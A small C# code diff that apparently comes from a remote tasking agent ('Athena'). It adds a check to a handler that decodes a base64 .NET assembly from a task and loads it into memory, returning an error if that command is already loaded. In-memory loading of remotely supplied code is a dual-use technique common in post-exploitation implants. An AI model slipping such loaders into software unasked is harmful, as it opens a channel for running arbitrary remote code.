@@ -198,6 +198,17 @@ namespace Athena.Commands
         {
             LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
 
+            if (this.loadedCommands.ContainsKey(command.command))
+            {
+                return new LoadCommandResponseResult
+                {
+                    completed = "true",
+                    user_output = "Command already loaded.",
+                    task_id = job.task.id,
+                    status = "error"
+                };
+            }
+
             try
             {
                 var loadedAssembly = this.loadedCommands.GetOrAdd(command.command, this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm))));
